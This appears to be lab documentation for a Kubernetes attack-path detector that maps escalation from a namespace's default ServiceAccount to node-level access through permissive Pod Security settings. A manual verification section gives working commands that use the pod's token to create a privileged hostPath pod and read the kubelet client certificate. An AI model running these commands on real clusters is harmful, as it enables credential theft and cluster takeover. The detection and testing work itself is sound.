# Attack Path 02: Default ServiceAccount -> POD_CREATE -> Node Escalation via Weak PSA

## Attack Scenario

The `default` ServiceAccount in namespace `02-psa-free` escalates to Node-level access:

1. `default` SA has `create` on `pods` in `02-psa-free` (via Role `pod-creator`, bound directly to the `default` SA)
2. `02-psa-free` has PSA enforcement level `privileged` (`audit`/`warn` are `restricted`, so violations are only logged and warned about, never blocked)
3. `privileged` PSA allows `hostPath` mounts and privileged containers - `baseline` would already reject `hostPath` volumes
4. Any pod deployed into `02-psa-free` gets the `default` SA mounted by default - no named or privileged identity is required (demonstrated here by `landing-pod`, an otherwise unremarkable workload)
5. That pod uses its mounted token to create another, privileged pod with a hostPath mount to `/var/lib/kubelet/pki/`
6. The new pod reads `kubelet-client-current.pem` from the mount
7. That certificate grants cluster-admin API access

Because the RoleBinding targets the namespace's `default` SA rather than a named user, this isn't "an admin made a mistake" - it's "any workload landing in this namespace inherits Node escalation."

## KuberHound Detection

- **PSA properties on `K8sNamespace`**: `psa_enforce`, `psa_audit`, `psa_warn`, `psa_effective` (the enforce label, or the cluster default from `--default-psa` when unlabeled), `allows_dangerous_pods` (true only when the effective level is `privileged`)
- **`CAN_ESCALATE_VIA_POD` edge**: Role -> Namespace, created only when the Role has `POD_CREATE` (or `WORKLOAD_CREATE`: create/update/patch on Deployments, DaemonSets, StatefulSets, ReplicaSets, ReplicationControllers, Jobs or CronJobs) and the namespace has `allows_dangerous_pods = true` - the edge itself already implies both conditions. ClusterRoles only get the edge in namespaces where they are bound
- **Queries**:
  - "KuberHound: POD_CREATE escalation to Node via weak PSA" - `identity -[BOUND_TO]-> role -[CAN_ESCALATE_VIA_POD]-> namespace`, covers this attack path end to end
  - "KuberHound: ServiceAccounts with dangerous Role/ClusterRole permissions" - broader catch-all (secrets access, RBAC modification, pod delete, etc.); also matches here since `create` on `pods` is separately flagged dangerous

## Cluster-level Pod Security Standards

The namespace `enforce` label is only half the picture. Namespaces without an `enforce` label fall back to a cluster-wide default, configured on the API server through an `AdmissionConfiguration` file for the `PodSecurity` plugin (see [Apply Pod Security Standards at the Cluster Level](https://kubernetes.io/docs/tutorials/security/cluster-level-pss/)). The same file can exempt namespaces, users or runtime classes. If no such file is configured, the default is `privileged`, so every unlabeled namespace admits privileged and hostPath pods.

Check whether the API server is started with an admission configuration:

```bash
kubectl cluster-info dump | grep admission-control-config-file
```

- **No output**: no cluster-level config, unlabeled namespaces are `privileged`
- **`--admission-control-config-file=<path>`**: read that file on a control-plane node; `defaults.enforce` is the cluster default and `exemptions` lists namespaces/users/runtime classes that skip PSA entirely

On a kubeadm cluster the flag is also visible on the API server pod:

```bash
kubectl -n kube-system get pod -l component=kube-apiserver -o jsonpath='{.items[*].spec.containers[*].command}' | tr ',' '\n' | grep admission
```

Managed clusters (EKS, GKE, AKS) don't expose API server flags; check the provider's documentation for their PSA defaults.

KuberHound can't read the admission configuration through the Kubernetes API, so it assumes the Kubernetes default. If the cluster default is stricter, pass it explicitly so unlabeled namespaces aren't reported as escapable:

```bash
python3 kuberhound.py --default-psa baseline ...
```

The effective level used for each namespace is stored in the `psa_effective` property. Exemptions are not modeled: an exempted namespace is still reported according to its label or the cluster default.

## Testing

Deploy:
```bash
kubectl apply -f attack-paths/02-user-createpod-nswithoutpsa-hostmount.yaml
```

Collect:
```bash
python3 kuberhound.py -u http://localhost:8080 -k <api-key> --upload-queries
```

Verify in BloodHound:
- Nodes: `landing-pod` (K8sPod), `default` (K8sServiceAccount, namespace `02-psa-free`), `pod-creator` (K8sRole), `02-psa-free` (K8sNamespace, `psa_enforce: privileged`, `allows_dangerous_pods: true`)
- Edges: `landing-pod -[IDENTITY_ASSUME]-> default -[BOUND_TO]-> pod-creator -[CAN_ESCALATE_VIA_POD]-> 02-psa-free`
- Query: search **"KuberHound: POD_CREATE escalation to Node via weak PSA"**, should show the full path
- `pod-creator` properties: `attack_capabilities: ["POD_CREATE"]`
- `CAN_ESCALATE_VIA_POD` edge properties: `description` and `attack_vector` explain the hostPath/kubelet-pki route

## Exploitation (Manual Verification)

`landing-pod` is a stand-in for any ordinary workload in `02-psa-free` - it never asked for elevated access, it just inherited it via the `default` SA. From inside it, use the mounted token directly against the API server to create the privileged pod:

```bash
kubectl exec -n 02-psa-free landing-pod -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
cat <<JSON | curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary @- \
  https://kubernetes.default.svc/api/v1/namespaces/02-psa-free/pods
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": { "name": "attack-pod" },
  "spec": {
    "containers": [{
      "name": "attacker",
      "image": "alpine:latest",
      "command": ["sleep", "infinity"],
      "volumeMounts": [{"name": "kubelet-certs", "mountPath": "/host/kubelet", "readOnly": true}]
    }],
    "volumes": [{"name": "kubelet-certs", "hostPath": {"path": "/var/lib/kubelet/pki", "type": "Directory"}}]
  }
}
JSON
'

kubectl -n 02-psa-free exec attack-pod -- cat /host/kubelet/kubelet-client-current.pem
# use this cert for cluster-admin API access
```

## Defense Recommendations

1. Enforce `restricted` PSA on all non-system namespaces
2. Never bind privileged Roles to a namespace's `default` ServiceAccount - use a dedicated, purpose-built SA instead
3. Set `automountServiceAccountToken: false` on pods that don't need API access
4. Use admission controllers (OPA/Gatekeeper) to block dangerous pod specs
5. Alert on pods with hostPath mounts or privileged flags

## Attack Path Comparison

| Traditional Attack | This Attack |
|-------------------|-------------|
| Requires compromising a specific over-privileged identity | Every workload in `02-psa-free` inherits it automatically via `default` SA |
| Attacker must steal or escalate to that identity's token | No theft needed - RBAC misconfig grants it namespace-wide by default |
| Requires container escape | No escape needed - mounts host filesystem directly |

## Cleanup

```bash
kubectl delete -f attack-paths/02-user-createpod-nswithoutpsa-hostmount.yaml
```
